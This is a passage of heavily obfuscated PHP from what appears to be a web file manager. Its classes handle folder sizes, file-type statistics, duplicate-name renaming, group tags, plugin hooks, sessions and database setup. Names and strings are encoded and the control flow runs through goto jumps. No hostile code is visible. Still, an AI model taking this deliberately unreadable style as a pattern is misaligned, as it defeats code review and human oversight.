array($™¶ˆ»øÖ[1985] => $ÈüÑÜ)); } } } public function targetSpaceSize($¸ÀİĞÖ, $ä¦ˆÌÉÕ) { $¥»àŸ·ì =& $_SERVER[´‹ô¯Œ]; $¸çîöİş = 0; $÷·ÂâŞÌ = $this->targetSourceRoot($¸ÀİĞÖ, $ä¦ˆÌÉÕ, !0); foreach ($÷·ÂâŞÌ as $„êÍ¦Œ) { if (!$„êÍ¦Œ) { continue; } $¸çîöİş += floatval($„êÍ¦Œ[$¥»àŸ·ì[79]]); $¾Íêİ…À = array($¥»àŸ·ì[669] => array($¥»àŸ·ì[629], $¥»àŸ·ì[607] . $„êÍ¦Œ[$¥»àŸ·ì[194]] . $¥»àŸ·ì[630])); $ğ¥‡üŒË = Model($¥»àŸ·ì[515])->field($¥»àŸ·ì[503])->where($¾Íêİ…À)->select(); $ğ¥‡üŒË = array_to_keyvalue($ğ¥‡üŒË, $¥»àŸ·ì[12], $¥»àŸ·ì[194]); $ğ¥‡üŒË = array_unique(array_filter($ğ¥‡üŒË)); if ($ğ¥‡üŒË) { $¾Íêİ…À = array($¥»àŸ·ì[503] => array($¥»àŸ·ì[504], $ğ¥‡üŒË)); $¸çîöİş += floatval($this->where($¾Íêİ…À)->sum($¥»àŸ·ì[79])); } } $¸çîöİş = !$¸çîöİş || $¸çîöİş <= 0 ? 0 : $¸çîöİş; return $¸çîöİş; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÃõÅ œ’) { return $this->fileTypeProfile($ÃõÅ œ’, SourceModel::TYPE_USER); } public function groupFileTypeProfile($µ®­á·ƒ) { return $this->fileTypeProfile($µ®­á·ƒ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($úÖ±ò«›, $ª•¸Ï) { $ˆæÙª¦Û =& $_SERVER[´‹ô¯Œ]; $šì•ù…˜ = $ˆæÙª¦Û[2322] . $úÖ±ò«› . $ˆæÙª¦Û[11] . $ª•¸Ï; $¤±¡ÖË = Cache::get($šì•ù…˜); if ($¤±¡ÖË) { return $¤±¡ÖË; } $¡¦“œè¸ = array($ˆæÙª¦Û[663] => 0); if ($úÖ±ò«› != !1) { $¡¦“œè¸[$ˆæÙª¦Û[583]] = $úÖ±ò«›; $¡¦“œè¸[$ˆæÙª¦Û[191]] = $ª•¸Ï; } $¨’÷º—œ = array(); $¨’÷º—œ[$ˆæÙª¦Û[2323]] = array($ˆæÙª¦Û[2324] => LNG($ˆæÙª¦Û[2323]), $ˆæÙª¦Û[2325] => $this->where($¡¦“œè¸)->count(), $ˆæÙª¦Û[634] => $this->where($¡¦“œè¸)->sum($ˆæÙª¦Û[79])); $›—ÀöÃ = KodIO::fileTypeList(); foreach ($›—ÀöÃ as $ê·¥–Ò• => $›ˆ¨×ÙÊ) { $¡¦“œè¸[$ˆæÙª¦Û[498]] = $this->fileTypeWhere($ê·¥–Ò•); $¨’÷º—œ[$ê·¥–Ò•] = array($ˆæÙª¦Û[2324] => $›ˆ¨×ÙÊ[$ˆæÙª¦Û[32]], $ˆæÙª¦Û[2325] => $this->where($¡¦“œè¸)->count(), $ˆæÙª¦Û[634] => $this->where($¡¦“œè¸)->sum($ˆæÙª¦Û[79])); } Cache::set($šì•ù…˜, $¨’÷º—œ, 1200); return $¨’÷º—œ; } public function fileNameExist($ ‘¾„‘, $¡½ëÚí) { $’Í˜üµ =& $_SERVER[´‹ô¯Œ]; $ºêİ²ëÑ = $this->field($’Í˜üµ[2326])->where(array($’Í˜üµ[193] => $ ‘¾„‘, $’Í˜üµ[32] => $¡½ëÚí, $’Í˜üµ[517] => 0))->find(); return is_array($ºêİ²ëÑ) ? $ºêİ²ëÑ[$’Í˜üµ[194]] : !1; } public function childList($Ä¼ù¼‚á) { $›Õ‘°º§ =& $_SERVER[´‹ô¯Œ]; $å¢ÇóŞ‡ = $›Õ‘°º§[2299] . $Ä¼ù¼‚á; if (isset(self::$cacheChildList[$å¢ÇóŞ‡])) { return self::$cacheChildList[$å¢ÇóŞ‡]; } $í„¿‹«š = array($›Õ‘°º§[193] => intval($Ä¼ù¼‚á), $›Õ‘°º§[517] => 0); $ó›¤ĞÙ· = $this->where($í„¿‹«š)->select(); $ó›¤ĞÙ· = $ó›¤ĞÙ· ? $ó›¤ĞÙ· : array(); self::$cacheChildList[$å¢ÇóŞ‡] = $ó›¤ĞÙ·; foreach ($ó›¤ĞÙ· as $ ìŞ×°) { $å¢ÇóŞ‡ = $›Õ‘°º§[545] . $ ìŞ×°[$›Õ‘°º§[194]]; self::$cacheSourceInfo[$å¢ÇóŞ‡] = $ ìŞ×°; } return $ó›¤ĞÙ·; } public function fileNameAuto($ô¢ˆâø, $ë€çç„, $´òµ¡ñ¾ = REPEAT_RENAME, $ªÏ„ªØ = false) { $¼¿ˆ¿êú =& $_SERVER[´‹ô¯Œ]; $“Õ¦¹òÍ = get_path_ext($ë€çç„); $ÔÏ÷ª•Â = $“Õ¦¹òÍ ? get_path_ext_name($ë€çç„) . $¼¿ˆ¿êú[2327] . $“Õ¦¹òÍ : $ë€çç„ . $¼¿ˆ¿êú[463]; $”á½²÷ = array($¼¿ˆ¿êú[193] => $ô¢ˆâø, $¼¿ˆ¿êú[517] => 0, $¼¿ˆ¿êú[32] => array($¼¿ˆ¿êú[462], $ÔÏ÷ª•Â)); $ğñ”½ª = $this->field($¼¿ˆ¿êú[32])->where($”á½²÷)->select(); $¶ éõ·Æ = array_to_keyvalue($ğñ”½ª, $¼¿ˆ¿êú[12], $¼¿ˆ¿êú[32]); return $this->fileNameAutoGet($¶ éõ·Æ, $ë€çç„, $´òµ¡ñ¾, $ªÏ„ªØ); } public function fileNameAutoGet($“ØšôßÓ, $†³ò™ûâ, $·ğÒ³Ùƒ, $Èä„Ø††) { $Á°ã¸™ =& $_SERVER[´‹ô¯Œ]; if ($·ğÒ³Ùƒ == REPEAT_REPLACE || !$“ØšôßÓ || !in_array_not_case($†³ò™ûâ, $“ØšôßÓ) || $Èä„Ø†† && $·ğÒ³Ùƒ != REPEAT_RENAME_FOLDER) { return $†³ò™ûâ; } if ($·ğÒ³Ùƒ == REPEAT_SKIP) { return !1; } $£Şõ¬„ì = $Á°ã¸™[10] . get_path_ext($†³ò™ûâ); $£Şõ¬„ì = $£Şõ¬„ì == $Á°ã¸™[10] || $Èä„Ø†† ? $Á°ã¸™[12] : $£Şõ¬„ì; for ($¤Õñ»ˆş = 1; $¤Õñ»ˆş <= count($“ØšôßÓ) + 1; $¤Õñ»ˆş++) { $‘Í…›ˆ€ = substr($†³ò™ûâ, 0, strlen($†³ò™ûâ) - strlen($£Şõ¬„ì)); $İœå§Ÿ = $‘Í…›ˆ€ . "\50{$¤Õñ»ˆş}\x29{$£Şõ¬„ì}"; if (!in_array_not_case($İœå§Ÿ, $“ØšôßÓ)) { return $İœå§Ÿ; } } } } goto c·Îäèö—ğ; cæäÎèµ‡ß: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($½ÌÒ±À²) { $ôÁË‹ô¤ =& $_SERVER[´‹ô¯Œ]; return array($ôÁË‹ô¤[2110] => array($½ÌÒ±À²[0], $ôÁË‹ô¤[2111]), $ôÁË‹ô¤[2112] => array($½ÌÒ±À²[0], $ôÁË‹ô¤[2113])); } protected function get($Ù¼Ææ ñ) { $›ÌùÒ³ =& $_SERVER[´‹ô¯Œ]; $ëÎ›Î¯˜ = Model($›ÌùÒ³[599])->metaGet($Ù¼Ææ ñ, $›ÌùÒ³[2114]); $šáí„Û½ = json_decode($ëÎ›Î¯˜, !0); return $šáí„Û½ ? $šáí„Û½ : array($›ÌùÒ³[2115] => $›ÌùÒ³[91], $›ÌùÒ³[448] => array()); } protected function set($÷°Şõã‘, $‚±ôáã²) { $Ü‘‰ØĞ° =& $_SERVER[´‹ô¯Œ]; $‚±ôáã² = $‚±ôáã² ? $‚±ôáã² : array($Ü‘‰ØĞ°[2115] => $Ü‘‰ØĞ°[91], $Ü‘‰ØĞ°[448] => array()); return Model($Ü‘‰ØĞ°[599])->metaSet($÷°Şõã‘, $Ü‘‰ØĞ°[2114], json_encode($‚±ôáã²)); } protected function getByTagID($“òÔ–Åô, $Ûõ™¸¦) { $çÏµÎãÏ =& $_SERVER[´‹ô¯Œ]; if (!$“òÔ–Åô || !$Ûõ™¸¦) { return !1; } if (!Model($çÏµÎãÏ[599])->getInfoSimple($“òÔ–Åô)) { return !1; } $Íø±°İÀ = $this->get($“òÔ–Åô); if (!$Íø±°İÀ || !isset($Íø±°İÀ[$çÏµÎãÏ[448]])) { return !1; } $©ºÍñÍ = array_find_by_field($Íø±°İÀ[$çÏµÎãÏ[448]], $çÏµÎãÏ[487], $Ûõ™¸¦); return is_array($©ºÍñÍ) ? $©ºÍñÍ : !1; } public function listSource($Şê«Éàæ, $íúĞÃ»®) { $õşŠ²æì =& $_SERVER[´‹ô¯Œ]; if ($íúĞÃ»® && !is_array($íúĞÃ»®)) { $íúĞÃ»® = array($íúĞÃ»®); } $­áøÎôó = $this->listData($Şê«Éàæ); $”¨ÖÒÕå = array(); foreach ($­áøÎôó as $Ã°Ì‰ïÛ) { $ñ¸¢ŞÓù = $Ã°Ì‰ïÛ[$õşŠ²æì[87]]; if (!$ñ¸¢ŞÓù) { continue; } if (!isset($”¨ÖÒÕå[$ñ¸¢ŞÓù])) { $”¨ÖÒÕå[$ñ¸¢ŞÓù] = array(); } $”¨ÖÒÕå[$ñ¸¢ŞÓù][] = $Ã°Ì‰ïÛ[$õşŠ²æì[512]]; } $ì¿€äÀÚ = array(); foreach ($”¨ÖÒÕå as $º®Ù•ñ => $øÁ••º) { $æ×¢ŠÔ = !0; if (!$íúĞÃ»®) { $ì¿€äÀÚ[] = $º®Ù•ñ; continue; } foreach ($íúĞÃ»® as $¦äñ·…) { if (!in_array($¦äñ·…, $øÁ••º)) { $æ×¢ŠÔ = !1; break; } } if ($æ×¢ŠÔ) { $ì¿€äÀÚ[] = $º®Ù•ñ; } } if (!$ì¿€äÀÚ) { return array(); } $ºµÔÈ¾ = array($õşŠ²æì[503] => array($õşŠ²æì[504], $ì¿€äÀÚ), $õşŠ²æì[583] => $Şê«Éàæ, $õşŠ²æì[191] => SourceModel::TYPE_GROUP); $›ÊğÚ°ƒ = Model($õşŠ²æì[1445])->listSource($ºµÔÈ¾); if (!$›ÊğÚ°ƒ || count($ì¿€äÀÚ) == $›ÊğÚ°ƒ[$õşŠ²æì[445]][$õşŠ²æì[446]]) { return $›ÊğÚ°ƒ; } $Øğ›ŒèÉ = array(); $ßÖ•¡ÔÄ = array_to_keyvalue($›ÊğÚ°ƒ[$õşŠ²æì[85]], $õşŠ²æì[12], $õşŠ²æì[194]); $àÌøÂÍ‡ = array_to_keyvalue($›ÊğÚ°ƒ[$õşŠ²æì[86]], $õşŠ²æì[12], $õşŠ²æì[194]); $† åñõ· = array_merge($àÌøÂÍ‡, $ßÖ•¡ÔÄ); foreach ($ì¿€äÀÚ as $ñ¸¢ŞÓù) { if (!in_array($ñ¸¢ŞÓù, $† åñõ·)) { $Øğ›ŒèÉ[] = $ñ¸¢ŞÓù; } } if ($Øğ›ŒèÉ) { $this->removeBySource($Şê«Éàæ, $Øğ›ŒèÉ); } return $›ÊğÚ°ƒ; } protected function listData($ãê‰çİ•) { $¶œéÉ¿ =& $_SERVER[´‹ô¯Œ]; $éÖ¼ëìÛ = array($¶œéÉ¿[1787] => 0, $¶œéÉ¿[571] => array($¶œéÉ¿[2116], 0), $¶œéÉ¿[508] => $¶œéÉ¿[1403] . $ãê‰çİ•); $Óˆ§çö· = $¶œéÉ¿[2117]; $§·„ŠùŒ = $this->field($Óˆ§çö·)->where($éÖ¼ëìÛ)->order($¶œéÉ¿[2118])->select(); return $§·„ŠùŒ ? $§·„ŠùŒ : array(); } protected function addToTag($› ¡ôÀù, $´ÓÑ©»Æ, $»É”ğ£Ó) { $¬‹½û«‚ =& $_SERVER[´‹ô¯Œ]; if (!$this->getByTagID($› ¡ôÀù, $»É”ğ£Ó) || !$´ÓÑ©»Æ) { return !1; } if (!Model($¬‹½û«‚[916])->pathInfo($´ÓÑ©»Æ)) { return !1; } $÷»‡–’Í = array($¬‹½û«‚[1787] => 0, $¬‹½û«‚[571] => $»É”ğ£Ó, $¬‹½û«‚[507] => $´ÓÑ©»Æ, $¬‹½û«‚[508] => $¬‹½û«‚[2119] . $› ¡ôÀù, $¬‹½û«‚[506] => $¬‹½û«‚[12], $¬‹½û«‚[2000] => 0); if ($this->where($÷»‡–’Í)->find()) { return !1; } return $this->add($÷»‡–’Í); } protected function removeFromTag($Ğ‹ÊÃŸè, $‰Ñ¡âæû, $‹«Ê«€) { $Óò÷ŞàÓ =& $_SERVER[´‹ô¯Œ]; if (!$this->getByTagID($Ğ‹ÊÃŸè, $‹«Ê«€) || !$‰Ñ¡âæû) { return !1; } if (is_array($‰Ñ¡âæû)) { $‰Ñ¡âæû = array($Óò÷ŞàÓ[7], $‰Ñ¡âæû); } $‡ŒïıŞ = array($Óò÷ŞàÓ[1787] => 0, $Óò÷ŞàÓ[571] => $‹«Ê«€, $Óò÷ŞàÓ[508] => $Óò÷ŞàÓ[2119] . $Ğ‹ÊÃŸè, $Óò÷ŞàÓ[507] => $‰Ñ¡âæû); return $this->where($‡ŒïıŞ)->delete(); } protected function removeByTag($ÍŸ÷¡Ôâ, $äá«²) { $©ÂëßÄ¡ =& $_SERVER[´‹ô¯Œ]; if (!$this->getByTagID($ÍŸ÷¡Ôâ, $äá«²)) { return !1; } $ÂÛ¼Ü„õ = array($©ÂëßÄ¡[1787] => 0, $©ÂëßÄ¡[571] => $äá«², $©ÂëßÄ¡[508] => $©ÂëßÄ¡[2119] . $ÍŸ÷¡Ôâ); return $this->where($ÂÛ¼Ü„õ)->delete(); } protected function removeBySource($ ùÜ², $¶¤‚ò‚Œ) { $ò“ÈúÜú =& $_SERVER[´‹ô¯Œ]; if (!$ ùÜ² || !$¶¤‚ò‚Œ) { return !1; } if (is_array($¶¤‚ò‚Œ)) { $¶¤‚ò‚Œ = array($ò“ÈúÜú[7], $¶¤‚ò‚Œ); } $ğ—ğÕĞ‘ = array($ò“ÈúÜú[1787] => 0, $ò“ÈúÜú[507] => $¶¤‚ò‚Œ, $ò“ÈúÜú[571] => array($ò“ÈúÜú[1106], 0), $ò“ÈúÜú[508] => $ò“ÈúÜú[2119] . $ ùÜ²); return $this->where($ğ—ğÕĞ‘)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\160\x6c\165\x67\151\x6e\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\163\164\141\x74\x75\x73", "\x72\x65\147\151\145\163\x74", "\x63\x6f\x6e\146\x69\x67"); public function loadList($ñ™»€² = false) { $˜Ş€Ğ¨’ = array_to_keyvalue($this->listData(), $_SERVER[´‹ô¯Œ][32]); if ($ñ™»€²) { return $˜Ş€Ğ¨’[$ñ™»€²]; } return $˜Ş€Ğ¨’; } public function init() { $ë÷µ°»ƒ =& $_SERVER[´‹ô¯Œ]; Hook::trigger($ë÷µ°»ƒ[2120]); $Ğ¨ÇÏ² = $this->loadPluginList(); foreach ($Ğ¨ÇÏ² as $”Ç»Ü–ô => $Ò“÷áî§) { $¥ñé½Şí = $this->appAllow($”Ç»Ü–ô, $Ò“÷áî§); if (!$¥ñé½Şí) { continue; } foreach ($Ò“÷áî§[$ë÷µ°»ƒ[2121]] as $ªÏİå± => $Âßƒ‹¼×) { Hook::bind($ªÏİå±, $Âßƒ‹¼×); } } Hook::trigger($ë÷µ°»ƒ[2122]); Hook::trigger(ACTION); } public function appAllow($¾Şß³ë´, $£÷·’üÃ, $´¡€³üÆ = true) { $Ö§ñ«— =& $_SERVER[´‹ô¯Œ]; $Œİ¢¤¸ş = PLUGIN_DIR . $¾Şß³ë´ . $Ö§ñ«—[2123]; if (!is_array($£÷·’üÃ) || !is_array($£÷·’üÃ[$Ö§ñ«—[2121]]) || $£÷·’üÃ[$Ö§ñ«—[836]] != 1 || !is_file($Œİ¢¤¸ş)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ö§ñ«—[6]][$Ö§ñ«—[2124]] || !$GLOBALS[$Ö§ñ«—[6]][$Ö§ñ«—[2125]]) { return !0; } $„Õ±¨÷ = explode($Ö§ñ«—[50], strtolower($GLOBALS[$Ö§ñ«—[6]][$Ö§ñ«—[2125]])); return in_array(strtolower($¾Şß³ë´), $„Õ±¨÷) ? !1 : !0; } if ($´¡€³üÆ && !Action($Ö§ñ«—[2126])->checkAuth($¾Şß³ë´)) { return !1; } return !0; } public function unInstall($¦Î‘İ×‹) { $¾ˆ§™´è =& $_SERVER[´‹ô¯Œ]; $›ÃÔØé¬ = $this->loadList($¦Î‘İ×‹); if (file_exists(PLUGIN_DIR . $¦Î‘İ×‹)) { Hook::apply($¦Î‘İ×‹ . $¾ˆ§™´è[2127]); } $this->remove($›ÃÔØé¬[$¾ˆ§™´è[487]]); } public function changeStatus($ƒ˜é‹, $™×¾ÃÍÎ) { $†İ½ò±æ =& $_SERVER[´‹ô¯Œ]; $ÙèÍîñ´ = $this->loadList($ƒ˜é‹); if ($™×¾ÃÍÎ) { Hook::apply($ƒ˜é‹ . $†İ½ò±æ[2128]); } $this->update($ÙèÍîñ´[$†İ½ò±æ[487]], array($†İ½ò±æ[2129] => $™×¾ÃÍÎ)); } public function appRegist($¢ìÂñı¢, $ú¸¸ùŞÜ) { $ªçŒİ¤ =& $_SERVER[´‹ô¯Œ]; $öô×µ²ù = $this->loadList($¢ìÂñı¢); if ($öô×µ²ù) { $this->update($öô×µ²ù[$ªçŒİ¤[487]], array($ªçŒİ¤[2121] => $ú¸¸ùŞÜ)); } else { $ßüÕÑØ = array($ªçŒİ¤[32] => $¢ìÂñı¢, $ªçŒİ¤[2121] => $ú¸¸ùŞÜ, $ªçŒİ¤[836] => 0, $ªçŒİ¤[6] => $this->getConfigDefault($¢ìÂñı¢)); $this->insert($ßüÕÑØ); } } public function getConfigDefault($šİÎºµ¸) { $­„¾œøû =& $_SERVER[´‹ô¯Œ]; $”Óœ” = array(); $ãÆŠùšä = $this->getPackageJson($šİÎºµ¸); if (!$ãÆŠùšä && is_array($ãÆŠùšä[$­„¾œøû[2130]])) { return $”Óœ”; } foreach ($ãÆŠùšä[$­„¾œøû[2130]] as $ıèò§¬õ => $›õïñöâ) { if (!isset($›õïñöâ[$­„¾œøû[453]]) || isset($”Óœ”[$ıèò§¬õ])) { continue; } $”Óœ”[$ıèò§¬õ] = $›õïñöâ[$­„¾œøû[453]]; } return $”Óœ”; } public function getPackageJson($‡€öÖåà) { return Hook::apply($‡€öÖåà . $_SERVER[´‹ô¯Œ][2131]); } public function getConfig($‚›éÓı¿, $‚ªÇ®³ = false) { $³„¹÷ì“ =& $_SERVER[´‹ô¯Œ]; $ü‡ë£ÖÉ = array(); $…–âöÊ× = $this->loadList($‚›éÓı¿); if ($…–âöÊ× && is_array($…–âöÊ×[$³„¹÷ì“[6]])) { $ü‡ë£ÖÉ = $…–âöÊ×[$³„¹÷ì“[6]]; } if (!$ü‡ë£ÖÉ || $‚ªÇ®³) { $ü‡ë£ÖÉ = $this->getConfigDefault($‚›éÓı¿); } return $ü‡ë£ÖÉ; } public function setConfig($ÓˆáÑÓè, $²˜’ñ°Ö = false) { $Ÿ‰èå±” =& $_SERVER[´‹ô¯Œ]; $Ş¡˜œ‡ò = $this->loadList($ÓˆáÑÓè); if (!$Ş¡˜œ‡ò) { return !1; } $¿‰áœôâ = $Ş¡˜œ‡ò[$Ÿ‰èå±”[6]]; if ($²˜’ñ°Ö == !1) { $¿‰áœôâ = array(); $²˜’ñ°Ö = $this->getConfigDefault($ÓˆáÑÓè); } foreach ($²˜’ñ°Ö as $¦ß´²½ğ => $öĞÎŠÆ½) { $¿‰áœôâ[$¦ß´²½ğ] = is_string($öĞÎŠÆ½) ? trim($öĞÎŠÆ½) : $öĞÎŠÆ½; } $this->update($Ş¡˜œ‡ò[$Ÿ‰èå±”[487]], array($Ÿ‰èå±”[6] => $¿‰áœôâ)); } public function viewList() { $Œß–™ÏÑ =& $_SERVER[´‹ô¯Œ]; $ÏÅøßäÈ = $this->loadList(); $this->pluginScan($ÏÅøßäÈ); $ÏÅøßäÈ = $this->loadPluginList(); $üÒ£†¼ = array(); foreach ($ÏÅøßäÈ as $ºÄÆã¦ç => $±úä¡™) { $‡¨‚¤“¤ = $±úä¡™; unset($±úä¡™[$Œß–™ÏÑ[2121]], $±úä¡™[$Œß–™ÏÑ[6]]); $Æ´¹±åú = PLUGIN_DIR . $±úä¡™[$Œß–™ÏÑ[32]] . $Œß–™ÏÑ[2123]; if (!is_file($Æ´¹±åú)) { continue; } $îŠÌÔ = Hook::apply($±úä¡™[$Œß–™ÏÑ[32]] . $Œß–™ÏÑ[2131]); if (!is_array($îŠÌÔ)) { continue; } $üÒ£†¼[$ºÄÆã¦ç] = array_merge($±úä¡™, $îŠÌÔ); if ($‡¨‚¤“¤[$Œß–™ÏÑ[6]][$Œß–™ÏÑ[1709]] != $îŠÌÔ[$Œß–™ÏÑ[1683]]) { Hook::apply($±úä¡™[$Œß–™ÏÑ[32]] . $Œß–™ÏÑ[2128]); $‡¨‚¤“¤[$Œß–™ÏÑ[6]][$Œß–™ÏÑ[1709]] = $îŠÌÔ[$Œß–™ÏÑ[1683]]; $this->update($±úä¡™[$Œß–™ÏÑ[487]], array($Œß–™ÏÑ[6] => $‡¨‚¤“¤[$Œß–™ÏÑ[6]])); } } return $üÒ£†¼; } private function loadPluginList() { $–˜úú›­ =& $_SERVER[´‹ô¯Œ]; $›åùÒ÷ß = $this->loadList(); if (strtolower(MOD) == $–˜úú›­[2132]) { return $›åùÒ÷ß; } $ë®°–è˜ = Hook::trigger($–˜úú›­[2133], $›åùÒ÷ß); if ($›åùÒ÷ß && !$ë®°–è˜) { die; } return $ë®°–è˜ ? $ë®°–è˜ : $›åùÒ÷ß; } private function pluginScan($ßù—ìº) { $öûíúä =& $_SERVER[´‹ô¯Œ]; recursion_dir(PLUGIN_DIR, $š´…ËÔƒ, $ÈƒÔº©„, 0); foreach ($š´…ËÔƒ as $ˆÈ±É¸) { $ ã™İ‡ = get_path_this($ˆÈ±É¸); if (isset($ßù—ìº[$ ã™İ‡]) || !file_exists($ˆÈ±É¸ . $öûíúä[2134]) || !file_exists($ˆÈ±É¸ . $öûíúä[2123])) { continue; } Hook::apply($ ã™İ‡ . $öûíúä[2128]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\137\163\145\x73\163\x69\x6f\156"; public function get($“ÓÅ¤—é) { $ÖŸºï  =& $_SERVER[´‹ô¯Œ]; $±³×ÁåÃ = $this->where(array($ÖŸºï [2135] => $“ÓÅ¤—é))->find(); if (!is_array($±³×ÁåÃ)) { return !1; } return $±³×ÁåÃ[$ÖŸºï [171]]; } public function set($¦úå‰¿ú, $¹§Öï¡‘, $Ñ‡¶ş¸æ = 3600) { $óøÌåŒ‹ =& $_SERVER[´‹ô¯Œ]; $€Ûã‹Ó„ = array($óøÌåŒ‹[2135] => $¦úå‰¿ú, $óøÌåŒ‹[2035] => $¹§Öï¡‘, $óøÌåŒ‹[2136] => $Ñ‡¶ş¸æ + time()); if (Session::get($óøÌåŒ‹[2137])) { $€Ûã‹Ó„[$óøÌåŒ‹[1796]] = Session::get($óøÌåŒ‹[2137]); } else { $€Ûã‹Ó„[$óøÌåŒ‹[1796]] = 0; } if ($this->get($¦úå‰¿ú)) { return $this->where(array($óøÌåŒ‹[2135] => $¦úå‰¿ú))->save($€Ûã‹Ó„); } else { return $this->add($€Ûã‹Ó„, array(), !0); } } public function remove($ûŠøºƒÅ) { return $this->where(array($_SERVER[´‹ô¯Œ][2135] => $ûŠøºƒÅ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[´‹ô¯Œ][2138] . time())->delete(); } } goto B™×¢¨††; d ¢¼§„: class DbSqlite3 extends DbSqlite3Base { public function query($Î Ğ¡½ ) { $Â‹¬¶Ñ¾ =& $_SERVER[´‹ô¯Œ]; if (!CacheLock::fileLock($Â‹¬¶Ñ¾[13])) { return !1; } $¥ÖÃâõ¤ = parent::query($Î Ğ¡½ ); CacheLock::fileUnLock($Â‹¬¶Ñ¾[13]); return $¥ÖÃâõ¤; } public function execute($·¥×˜Ï) { $ª¹äÖñğ =& $_SERVER[´‹ô¯Œ]; if (!CacheLock::fileLock($ª¹äÖñğ[13])) { return !1; } $¹˜ª¿¦ş = parent::execute($·¥×˜Ï); CacheLock::fileUnLock($ª¹äÖñğ[13]); return $¹˜ª¿¦ş; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\145\161" => "\74\x3e", "\x67\x74" => "\x3e", "\145\147\x74" => "\76\75", "\x6c\x74" => "\x3c", "\x65\154\x74" => "\74\x3d", "\x6e\x6f\164\x6c\x69\x6b\x65" => "\x4e\117\124\40\x4c\111\x4b\105", "\154\x69\153\145" => "\x4c\x49\113\x45", "\151\x6e" => "\111\x4e", "\x6e\x6f\164\151\156" => "\x4e\117\124\40\x49\116", "\156\157\x74\x20\151\156" => "\x4e\117\x54\x20\x49\116", "\142\x65\x74\x77\145\145\x6e" => "\x42\x45\124\x57\105\x45\116", "\x6e\157\164\142\145\164\167\145\x65\156" => "\x4e\117\x54\40\x42\105\124\127\x45\x45\116", "\x6e\157\x74\40\142\x65\164\x77\145\x65\x6e" => "\x4e\x4f\x54\x20\102\x45\124\127\105\105\x4e"); protected $selectSql = "\x53\x45\x4c\105\x43\x54\45\104\x49\x53\x54\x49\116\x43\124\x25\40\45\106\111\x45\114\104\x25\40\106\122\x4f\x4d\x20\x25\124\x41\x42\x4c\105\45\45\112\x4f\111\116\45\45\127\x48\x45\122\105\45\x25\x47\x52\x4f\x55\120\x25\45\110\x41\126\x49\116\107\x25\45\x4f\x52\x44\x45\122\45\x25\114\x49\115\111\124\45\40\45\125\116\x49\117\x4e\45\x25\x43\x4f\x4d\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $»¸¾è¾Â = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[´‹ô¯Œ][1052], $»¸¾è¾Â); } public function factory($ãÙ®ƒ»« = '') { $û½áıªĞ =& $_SERVER[´‹ô¯Œ]; $ãÙ®ƒ»« = $this->parseConfig($ãÙ®ƒ»«); if (empty($ãÙ®ƒ»«[$û½áıªĞ[1053]])) { think_exception(think_lang($û½áıªĞ[1054])); } $this->dbType = ucwords(strtolower($ãÙ®ƒ»«[$û½áıªĞ[1053]])); $óø£Î²— = $û½áıªĞ[1055] . $this->dbType; if (class_exists($óø£Î²—)) { $ªıÒîŠŞ = new $óø£Î²—($ãÙ®ƒ»«); if ($û½áıªĞ[1056] != strtolower($ãÙ®ƒ»«[$û½áıªĞ[1053]])) { $ªıÒîŠŞ->dbType = strtoupper($this->dbType); } else { $ªıÒîŠŞ->dbType = $this->_getDsnType($ãÙ®ƒ»«[$û½áıªĞ[1008]]); } } else { think_exception(think_lang($û½áıªĞ[1057]) . $û½áıªĞ[1058] . $óø£Î²—); } return $ªıÒîŠŞ; } public function __call($î„Ç’±Ê, $¤Ş¦’ÑÂ) { if (method_exists($this, $î„Ç’±Ê)) { return call_user_func_array(array($this, $î„Ç’±Ê), $¤Ş¦’ÑÂ); } } protected function _getDsnType($ç‘À²¥Ç) { $ŒÃã·Å = explode($_SERVER[´‹ô¯Œ][4], $ç‘À²¥Ç); $Ÿíà‰•÷ = strtoupper(trim($ŒÃã·Å[0])); return $Ÿíà‰•÷; } private function parseConfig($¾‘ì‹Ä• = '') { $¡ÓŸ…âë =& $_SERVER[´‹ô¯Œ]; if (!empty($¾‘ì‹Ä•) && is_string($¾‘ì‹Ä•)) { $¾‘ì‹Ä• = $this->parseDSN($¾‘ì‹Ä•); } elseif (is_array($¾‘ì‹Ä•)) { $¾‘ì‹Ä• = array_change_key_case($¾‘ì‹Ä•); $¾‘ì‹Ä• = array($¡ÓŸ…âë[1053] => $¾‘ì‹Ä•[$¡ÓŸ…âë[1059]], $¡ÓŸ…âë[980] => $¾‘ì‹Ä•[$¡ÓŸ…âë[1060]], $¡ÓŸ…âë[981] => $¾‘ì‹Ä•[$¡ÓŸ…âë[1061]], $¡ÓŸ…âë[978] => $¾‘ì‹Ä•[$¡ÓŸ…âë[1062]], $¡ÓŸ…âë[979] => $¾‘ì‹Ä•[$¡ÓŸ…âë[1063]], $¡ÓŸ…âë[21] => $¾‘ì‹Ä•[$¡ÓŸ…âë[1064]], $¡ÓŸ…âë[1008] => $¾‘ì‹Ä•[$¡ÓŸ…âë[1065]], $¡ÓŸ…âë[17] => isset($¾‘ì‹Ä•[$¡ÓŸ…âë[1066]]) ? $¾‘ì‹Ä•[$¡ÓŸ…âë[1066]] : array()); } elseif (empty($¾‘ì‹Ä•)) { if (think_config($¡ÓŸ…âë[1067]) && $¡ÓŸ…âë[1056] != strtolower(think_config($¡ÓŸ…âë[1068]))) { $¾‘ì‹Ä• = $this->parseDSN(think_config($¡ÓŸ…âë[1067])); } else { $¾‘ì‹Ä• = array($¡ÓŸ…âë[1053] => think_config($¡ÓŸ…âë[1068]), $¡ÓŸ…âë[980] => think_config($¡ÓŸ…âë[1069]), $¡ÓŸ…âë[981] => 